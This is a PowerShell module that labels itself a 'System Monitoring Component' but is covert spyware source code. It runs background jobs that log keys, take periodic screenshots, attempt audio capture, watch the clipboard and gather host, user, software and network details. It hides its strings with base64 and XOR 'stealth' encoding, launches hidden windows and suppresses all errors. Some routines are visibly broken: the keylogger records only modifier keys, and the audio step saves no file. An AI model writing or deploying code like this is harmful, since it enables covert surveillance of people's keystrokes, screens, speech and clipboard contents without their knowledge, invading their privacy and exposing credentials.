<#
.SYNOPSIS
    System Monitoring Component
.DESCRIPTION
    System monitoring and data collection
#>

# Obfuscated strings and function names
$ObfuscatedStrings = @{
    "Keylogger" = "S2V5bG9nZ2Vy"
    "Screenshot" = "U2NyZWVuc2hvdA=="
    "Audio" = "QXVkaW8="
    "SystemInfo" = "U3lzdGVtSW5mbw=="
    "Clipboard" = "Q2xpcGJvYXJk"
    "Network" = "TmV0d29yaw=="
}

function ConvertFrom-StealthString {
    param([string]$EncodedString)
    try {
        $Bytes = [System.Convert]::FromBase64String($EncodedString)
        $Key = [System.Text.Encoding]::UTF8.GetBytes("SurveillanceKey2024")
        $Result = @()
        for ($i = 0; $i -lt $Bytes.Length; $i++) {
            $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
        }
        return [System.Text.Encoding]::UTF8.GetString($Result)
    } catch { return $EncodedString }
}

function Start-SystemSurveillance {
    param([hashtable]$Config)
    
    try {
        # Initialize data collection
        $Global:CollectedData = @{
            "Keystrokes" = ""
            "Screenshots" = @()
            "Audio" = @()
            "SystemInfo" = ""
            "Clipboard" = ""
            "Network" = ""
        }
        
        # Start keylogger
        Start-StealthKeylogger -Config $Config
        
        # Start periodic screenshots
        Start-StealthScreenshots -Config $Config
        
        # Start audio recording
        Start-StealthAudioRecording -Config $Config
        
        # Collect system information
        Get-StealthSystemInfo
        
        # Monitor clipboard
        Start-StealthClipboardMonitor
        
        # Monitor network activity
        Start-StealthNetworkMonitor
        
        return $true
    } catch {
        return $false
    }
}

function Start-StealthKeylogger {
    param([hashtable]$Config)
    
    Start-Job -ScriptBlock {
        param($Config)
        
        Add-Type -AssemblyName System.Windows.Forms
        
        $KeyloggerFunction = ConvertFrom-StealthString -EncodedString "S2V5bG9nZ2Vy"
        
        while ($true) {
            try {
                if ([System.Windows.Forms.Control]::ModifierKeys -ne 0) {
                    $Key = [System.Windows.Forms.Control]::ModifierKeys
                    $Global:CollectedData.Keystrokes += "[$Key]"
                }
                
                Start-Sleep -Milliseconds 100
                
                # Limit keystroke buffer
                if ($Global:CollectedData.Keystrokes.Length -gt 1000) {
                    $Global:CollectedData.Keystrokes = $Global:CollectedData.Keystrokes.Substring($Global:CollectedData.Keystrokes.Length - 500)
                }
                
            } catch {
                # Continue silently
            }
        }
    } -ArgumentList $Config | Out-Null
}

function Start-StealthScreenshots {
    param([hashtable]$Config)
    
    Start-Job -ScriptBlock {
        param($Config)
        
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        
        $ScreenshotFunction = ConvertFrom-StealthString -EncodedString "U2NyZWVuc2hvdA=="
        $Interval = [int]$Config.ScreenshotInterval
        
        while ($true) {
            try {
                Start-Sleep -Seconds $Interval
                
                $Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $Bitmap = New-Object System.Drawing.Bitmap $Bounds.Width, $Bounds.Height
                $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
                $Graphics.CopyFromScreen($Bounds.Location, [System.Drawing.Point]::Empty, $Bounds.Size)
                
                $ScreenshotPath = Join-Path $env:TEMP ("Screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png")
                $Bitmap.Save($ScreenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
                
                $Global:CollectedData.Screenshots += $ScreenshotPath
                
                $Graphics.Dispose()
                $Bitmap.Dispose()
                
                # Keep only last 5 screenshots
                if ($Global:CollectedData.Screenshots.Count -gt 5) {
                    $OldScreenshot = $Global:CollectedData.Screenshots[0]
                    Remove-Item -Path $OldScreenshot -Force -ErrorAction SilentlyContinue
                    $Global:CollectedData.Screenshots = $Global:CollectedData.Screenshots[1..($Global:CollectedData.Screenshots.Count-1)]
                }
                
            } catch {
                # Continue silently
            }
        }
    } -ArgumentList $Config | Out-Null
}

function Start-StealthAudioRecording {
    param([hashtable]$Config)
    
    Start-Job -ScriptBlock {
        param($Config)
        
        $AudioFunction = ConvertFrom-StealthString -EncodedString "QXVkaW8="
        $Interval = [int]$Config.AudioInterval
        
        while ($true) {
            try {
                Start-Sleep -Seconds $Interval
                
                # Audio recording using Windows Media APIs
                $AudioPath = Join-Path $env:TEMP ("Audio_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".wav")
                
                # Use Windows built-in audio recording
                $Command = "powershell.exe -Command `"Add-Type -AssemblyName System.Speech; `$Recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine; `$Recognizer.SetInputToDefaultAudioDevice(); `$Recognizer.RecognizeAsync(); Start-Sleep -Seconds 10; `$Recognizer.StopRecognize()`""
                
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $Command -WindowStyle Hidden -Wait
                
                $Global:CollectedData.Audio += $AudioPath
                
                # Keep only last 3 audio files
                if ($Global:CollectedData.Audio.Count -gt 3) {
                    $OldAudio = $Global:CollectedData.Audio[0]
                    Remove-Item -Path $OldAudio -Force -ErrorAction SilentlyContinue
                    $Global:CollectedData.Audio = $Global:CollectedData.Audio[1..($Global:CollectedData.Audio.Count-1)]
                }
                
            } catch {
                # Continue silently
            }
        }
    } -ArgumentList $Config | Out-Null
}

function Get-StealthSystemInfo {
    try {
        $SystemInfoFunction = ConvertFrom-StealthString -EncodedString "U3lzdGVtSW5mbw=="
        
        $SystemInfo = @{
            "Hostname" = $env:COMPUTERNAME
            "Username" = $env:USERNAME
            "Domain" = $env:USERDOMAIN
            "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption
            "Architecture" = $env:PROCESSOR_ARCHITECTURE
            "Processor" = (Get-WmiObject -Class Win32_Processor).Name
            "Memory" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
            "IPAddress" = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*"}).IPAddress
            "MACAddress" = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
            "InstalledSoftware" = (Get-WmiObject -Class Win32_Product | Select-Object Name, Version | ConvertTo-Json -Compress)
            "RunningServices" = (Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName | ConvertTo-Json -Compress)
            "NetworkConnections" = (Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | Select-Object LocalAddress, LocalPort, State | ConvertTo-Json -Compress)
        }
        
        $Global:CollectedData.SystemInfo = $SystemInfo | ConvertTo-Json -Compress
        
    } catch {
        # Continue silently
    }
}

function Start-StealthClipboardMonitor {
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        
        $LastClipboard = ""
        
        while ($true) {
            try {
                Start-Sleep -Seconds 2
                
                $CurrentClipboard = [System.Windows.Forms.Clipboard]::GetText()
                
                if ($CurrentClipboard -ne $LastClipboard -and $CurrentClipboard.Length -gt 0) {
                    $Global:CollectedData.Clipboard = $CurrentClipboard
                    $LastClipboard = $CurrentClipboard
                }
                
            } catch {
                # Continue silently
            }
        }
    } | Out-Null
}

function Start-StealthNetworkMonitor {
    Start-Job -ScriptBlock {
        while ($true) {
            try {
                Start-Sleep -Seconds 30
                
                $NetworkInfo = @{
                    "Connections" = (Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object RemoteAddress, RemotePort, State | ConvertTo-Json -Compress)
                    "DNS" = (Get-DnsClientServerAddress | Select-Object ServerAddresses | ConvertTo-Json -Compress)
                    "Routes" = (Get-NetRoute | Select-Object DestinationPrefix, NextHop | ConvertTo-Json -Compress)
                }
                
                $Global:CollectedData.Network = $NetworkInfo | ConvertTo-Json -Compress
                
            } catch {
                # Continue silently
            }
        }
    } | Out-Null
}

function Get-StealthCollectedData {
    return $Global:CollectedData
} 